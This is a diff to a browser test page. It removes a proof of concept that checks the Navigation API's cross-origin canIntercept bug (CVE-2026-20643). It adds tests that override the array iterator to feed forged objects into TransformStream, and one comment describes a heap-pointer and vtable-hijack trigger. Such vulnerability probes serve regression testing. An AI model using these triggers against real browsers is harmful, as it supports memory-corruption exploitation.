@@ -1,102 +1,71 @@
-<!doctype html>
-<html lang="en">
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>CVE-2026-20643 minimal PoC</title>
-<style>
-  body { font: 14px/1.4 ui-monospace, Menlo, Consolas, monospace; margin: 20px; }
-  button { padding: 8px 12px; font-size: 14px; }
-  pre { background: #111; color: #ddd; padding: 12px; white-space: pre-wrap; min-height: 140px; }
-  #verdict { font-size: 20px; font-weight: bold; margin-top: 12px; padding: 12px; display: none; }
-  #verdict.vuln  { background: #3a0000; color: #ff4444; }
-  #verdict.safe  { background: #003a00; color: #44ff44; }
-</style>
-<h1>CVE-2026-20643 PoC</h1>
-<p>Tests whether <code>NavigateEvent.canIntercept</code> is incorrectly <code>true</code> for cross-port navigations.</p>
-<button id="run" type="button">Run PoC</button>
-<div id="verdict"></div>
-<pre id="out"></pre>
+<!DOCTYPE html>
+<html>
+<body>
+<div id="result"></div>
 <script>
-(() => {
-  const out = document.getElementById("out");
-  const verdict = document.getElementById("verdict");
-  const log = (s) => { out.textContent += s + "\n"; };
-
-  function setVerdict(vuln) {
-    verdict.style.display = "block";
-    if (vuln) {
-      verdict.className = "vuln";
-      verdict.textContent = "VULNERABLE — canIntercept=true on cross-origin target (CVE-2026-20643)";
-    } else {
-      verdict.className = "safe";
-      verdict.textContent = "PATCHED — canIntercept=false as expected";
+function check(label, fn) {
+    let message;
+    try {
+        fn();
+        message = "FAIL: " + label + " did not throw";
+    } catch (e) {
+        if (e instanceof TypeError)
+            message = "PASS: " + label + " threw TypeError";
+        else
+            message = "FAIL: " + label + " threw " + e;
     }
-  }
+    const div = document.createElement("div");
+    div.textContent = message;
+    document.getElementById("result").appendChild(div);
+}
 
-  function defaultCrossPortTarget() {
-    const u = new URL(location.href);
-    const port = u.port || (u.protocol === "https:" ? "443" : "80");
-    const other = port === "8800" ? "8000" : "8800";
-    return `${u.protocol}//${u.hostname}:${other}/`;
-  }
+const originalIterator = Array.prototype[Symbol.iterator];
 
-  document.getElementById("run").addEventListener("click", () => {
-    out.textContent = "";
-    verdict.style.display = "none";
-
-    if (!window.navigation) {
-      log("Inconclusive: window.navigation unavailable.");
-      return;
-    }
-
-    const target = new URL(defaultCrossPortTarget(), location.href);
-    const crossOrigin = target.origin !== location.origin;
-    log(`from:         ${location.href}`);
-    log(`to:           ${target.href}`);
-    log(`cross-origin: ${crossOrigin}`);
-    log("");
-
-    let hit = false;
-    const onNavigate = (event) => {
-      if (event.destination?.url !== target.href)
-        return;
-      hit = true;
-
-      log(`canIntercept: ${event.canIntercept}`);
-
-      if (crossOrigin && event.canIntercept) {
-        try {
-          event.intercept({
-            handler() {
-              log("intercept() handler ran on cross-origin target");
-            }
-          });
-        } catch (e) {
-          log(`intercept() threw: ${e}`);
+// Variant 1: substitute plain objects for the readable/writable slots.
+Array.prototype[Symbol.iterator] = function() {
+    const arr = this;
+    let i = 0;
+    return {
+        next() {
+            if (i >= arr.length)
+                return { done: true };
+            let val = arr[i];
+            if (arr.length === 3 && i >= 1)
+                val = { fake: true };
+            i++;
+            return { value: val, done: false };
         }
-        setVerdict(true);
-      } else {
-        event.preventDefault();
-        setVerdict(false);
-      }
     };
+};
+check("plain-object substitution", () => new TransformStream());
 
-    navigation.addEventListener("navigate", onNavigate, { once: true });
+// Variant 2: substitute an object that holds a heap pointer (would survive
+// the initial dereference and trigger the write-increment / vtable hijack).
+let buf = new ArrayBuffer(65536);
+Array.prototype[Symbol.iterator] = function() {
+    const arr = this;
+    let i = 0;
+    return {
+        next() {
+            if (i >= arr.length)
+                return { done: true };
+            let val = arr[i];
+            if (arr.length === 3 && i >= 1)
+                val = { pad: 0, ptr: buf };
+            i++;
+            return { value: val, done: false };
+        }
+    };
+};
+check("object-reference substitution", () => new TransformStream());
 
-    const a = document.createElement("a");
-    a.href = target.href;
-    a.rel = "noreferrer";
-    a.style.display = "none";
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
+// Variant 3: truncated iterator returning fewer than 3 entries.
+Array.prototype[Symbol.iterator] = function() {
+    return { next() { return { done: true }; } };
+};
+check("truncated iterator", () => new TransformStream());
 
-    setTimeout(() => {
-      if (!hit) {
-        log("Inconclusive: no matching navigate event observed.");
-      }
-    }, 1200);
-  });
-})();
+Array.prototype[Symbol.iterator] = originalIterator;
 </script>
+</body>
 </html>
